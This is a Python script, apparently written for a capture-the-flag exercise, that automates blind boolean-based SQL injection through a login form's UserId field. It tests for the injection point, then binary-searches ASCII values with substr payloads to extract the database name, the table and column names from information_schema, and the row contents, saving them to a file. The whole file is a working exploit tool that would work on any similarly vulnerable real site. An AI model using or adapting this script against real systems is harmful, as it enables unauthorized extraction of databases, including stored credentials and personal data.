import requests
from urllib import parse
from diff_match_patch import diff_match_patch
from bs4 import BeautifulSoup

f = open("result.txt",'w')
dmp = diff_match_patch()

###########################0단계 - 함수 define ----------------------------------

def printNwrite(string):
    print(string+"\n")
    f.write(string+"\n")

def binSearch(query, checkValue):
    substridx = 1 #substr함수의 중간인자값
    start = 32 #ascii비교 시작부분
    end = 126  #ascii비교 끝부분
    value = ''
    while True:
        mid = int((start+end)/2) #int를 안씌우면 float가 될 수 있음
        payload = attackFormatStart+attackFunction+query+attackFormatEnd1+str(substridx)+attackFormatEnd2+str(0)+attackFormatEnd3
        response = requests.post(links, data={'UserId':payload,'Password':'1234','Submit':'Login'})
        if checkValue in response.text: #checkValue값이 text에 나오면, 그러니까 false response가 보이면
            break#ascii코드가 >0을 했을때 false값이 나온다면 여기부터는 값이 없다. 그러니 break.
        else:
            payload = attackFormatStart+attackFunction+query+attackFormatEnd1+str(substridx)+attackFormatEnd2+str(mid)+attackFormatEnd3
            response = requests.post(links, data={'UserId':payload,'Password':'1234','Submit':'Login'})
            if checkValue in response.text: 
                end = mid #여기에 false값이 있다면 이것보다는 작을 것이므로 end값에 mid를 넣는다. mid가 현재 찾고 있는 번호다.
            else:
                start = mid #아니라면 이것보다 클 수 있으므로 start에 mid를 넣는다.
            if start+1 >= end : #start == end라면 start+1가 end보다 크게되고, start<end인데 하나차이라면 서로 start==end가 된다.
                value += chr(end)#value값에 end를 추가한다.
                substridx += 1 #다음꺼 찾아라
                start = 32
                end = 126 #start/end 초기화
    return value

def listing(itemName,lis):
    idx = 1
    for name in lis:
        printNwrite(itemName+" "+str(idx)+". : "+name)
        idx+=1

def choose(itemName,lis):
    if len(lis)>1:
        retval = lis[int(input("Select a "+itemName+" : "+itemName+" Number."))-1]
    else:
        retval = lis[0]
    return retval


##########################1단계 - sql injection point #link + parameter----------------------------
print(" -----------------------[*] 1st Step : SQL injection Point -----------------------\n")
print("\n type link ex : http://ctf.segfaulthub.com:7777/sqli_2/login.php")
links = "http://"+input("Link(without parameter) : http://")
sqliCheckPayload = "normaltic' and true and '1\'='1"

successfulResponse = requests.post(links, data={'UserId':'normaltic','Password':'1234','Submit':'Login'})
sqliResponse = requests.post(links, data={'UserId':sqliCheckPayload,'Password':'1234','Submit':'Login'})
failedResponse = requests.post(links, data={'UserId':'normaltic','Password':'failfailfail','Submit':'Login'})

before = BeautifulSoup(successfulResponse.text,"lxml").text.replace('\n','')
after = BeautifulSoup(sqliResponse.text,"lxml").text.replace('\n','')
res_dif = dmp.diff_main(before,after)
dmp.diff_cleanupSemantic(res_dif)

if len(res_dif)==1:
    print("\nSQLi Point Spotted!! ╰(*°▽°*)╯\n")
else:
    print("\n*************\n\n!!!!!!!!!SQLi Point MISSED!!!!!!!!!\n\n*************\n")

##########################2단계 - check if select phrase works #columnCount ----------------------------
print("\n -----------------------[**] 2nd Step : Checking Select Phrase -----------------------\n")
selectCheckPayload = "normaltic' and ((select 'test')='test') and '1'='1"
selectResponse = requests.post(links, data={'UserId':selectCheckPayload,'Password':'1234','Submit':'Login'})

after = BeautifulSoup(selectResponse.text,"lxml").text.replace('\n','')
res_dif = dmp.diff_main(before,after)
dmp.diff_cleanupSemantic(res_dif)

if len(res_dif)==1:
    print("\nSelect Phrase Works!!!! ╰(*°▽°*)╯\n")
else:
    print("\n*************\n\n!!!!!!!!!Select Phrase Not Work!!!!!!!!!\n\n*************\n")

###########################3단계 - 어택포맷 -------------------------------------------
print("\n -----------------------[***] 3rd Step : Attack Format -----------------------\n")
#normaltic' and (ascii(substr((중요 쿼리),1,1)) > 0) and '1'='1
attackFormatStart ="normaltic' and "
attackFunction = "(ascii(substr(("
#여기쯤에 페이로드를 넣으면 된다.
attackFormatEnd1 = "),"
#substridx = 1
attackFormatEnd2 = ",1)) > "
#asciiSearch = 0
attackFormatEnd3 = ") and '1'='1"

payload = attackFormatStart+attackFunction+"__"+attackFormatEnd1+str(1)+attackFormatEnd2+str(0)+attackFormatEnd3
printNwrite("\nAttack Format : "+payload+"\n")
#normaltic' and (ascii(substr((__),1,1)) > 0) and '1'='1

print("type the value to manifest 'false' response. ex : Warning!")
checkValueidx = input("'false' response : ")

###########################4단계 - DB 확인--------------------------------------------------------
print("\n -----------------------[****] 4th Step : DB Name! -----------------------\n")
#normaltic' and (ascii(substr((select database()),1,1)) > 0) and '1'='1
dbQuery = "select database()"
dbName = binSearch(dbQuery,checkValueidx)
printNwrite("DB Name : "+dbName)

###########################5단계 - 테이블 확인--------------------------------------------------------
print("\n -----------------------[*****] 5th Step : Table Name! -----------------------\n")
tableName = []

for i in range(0,40):
    tableQuery = "select table_name from information_schema.tables where table_schema='"+dbName+"' limit "+str(i)+",1"
    payload = attackFormatStart+attackFunction+tableQuery+attackFormatEnd1+str(1)+attackFormatEnd2+str(0)+attackFormatEnd3
    response = requests.post(links, data={'UserId':payload,'Password':'1234','Submit':'Login'})
    if checkValueidx in response.text:
        break
    tableName.append(binSearch(tableQuery,checkValueidx))

print("_______________table all searched_______________")
tableName = list(filter(None,tableName))
listing("Table",tableName)
table = choose("Table",tableName)
printNwrite("\n selected Table : "+table+"\n")

###########################6단계 - 컬럼 확인--------------------------------------------------------
print("\n -----------------------[******] 6th Step : Column Name! -----------------------\n")
columnName = []

for i in range(0,40):
    columnQuery = "select column_name from information_schema.columns where table_name='"+table+"' limit "+str(i)+",1"
    payload = attackFormatStart+attackFunction+columnQuery+attackFormatEnd1+str(1)+attackFormatEnd2+str(0)+attackFormatEnd3
    response = requests.post(links, data={'UserId':payload,'Password':'1234','Submit':'Login'})
    if checkValueidx in response.text:
        break
    columnName.append(binSearch(columnQuery,checkValueidx))

print("_______________column all searched_______________")
columnName = list(filter(None,columnName))
listing("Column",columnName)
column = choose("Column",columnName)
printNwrite("\n selected Column : "+column+"\n")


###########################7단계 - 데이터 추출--------------------------------------------------------
print("\n -----------------------[*******] 7th Step : DB squeeze! -----------------------\n")
rowName = []

for i in range(0,40):
    rowQuery = "select "+column+" from "+table+" limit "+str(i)+",1"
    payload = attackFormatStart+attackFunction+rowQuery+attackFormatEnd1+str(1)+attackFormatEnd2+str(0)+attackFormatEnd3
    response = requests.post(links, data={'UserId':payload,'Password':'1234','Submit':'Login'})
    if checkValueidx in response.text:
        break
    rowName.append(binSearch(rowQuery,checkValueidx))

print("_______________row all searched_______________")
rowName = list(filter(None,rowName))
listing("Row",rowName)


